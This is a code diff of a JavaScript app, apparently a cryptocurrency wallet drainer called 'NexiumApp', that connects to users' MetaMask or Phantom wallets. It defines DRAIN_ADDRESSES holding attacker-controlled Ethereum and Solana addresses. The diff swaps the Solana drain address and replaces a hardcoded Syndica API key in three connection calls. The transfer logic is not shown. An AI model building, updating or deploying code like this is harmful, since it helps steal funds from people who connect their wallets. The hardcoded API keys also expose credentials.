@@ -32,7 +32,7 @@ import * as ethers from 'ethers';
 
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+  solana: "3sJiXd6G8GQiiDecxgxLqSrL9bX7VnbMv4H9kbEXag7o"
 };
 
 const POPULAR_SPL_TOKENS = [
@@ -306,7 +306,7 @@ class NexiumApp {
         }
 
         this.publicKey = accounts[0];
-        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
+        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
         console.log(`${walletName} connected via extension: ${this.publicKey}`); // Log 38
         this.connectedWalletType = walletName;
         console.log(`Setting button state to connected for ${walletName}`); // Log 39
@@ -352,7 +352,7 @@ class NexiumApp {
               this.connecting = false;
               return;
             }
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`MetaMask connected via deeplink: ${this.publicKey}`); // Log 48
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 49
@@ -370,7 +370,7 @@ class NexiumApp {
           const response = await window.solana.connect().catch(() => null);
           if (response && response.publicKey) {
             this.publicKey = response.publicKey.toString();
-            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/2F4RzncerbMXhPvN6JjPGsegmAcnSg786uQWVzc6VNM2CFfjwqFLEJjJodSa5JRi4DXNDLUMgd9X7iR3yCFqmdx9KXv5FNJYMCr`, {commitment: 'confirmed', wsEndpoint: ''});
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/3uos127kJoe6edcvVqR4LSzQqq5867v1kZdHdUstDyX96Qvep49BpkQQwoBD5W1hwif9H6GknBFJA4cSTvso6Py4MvD5txBKu1a`, {commitment: 'confirmed', wsEndpoint: ''});
             console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 53
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`); // Log 54
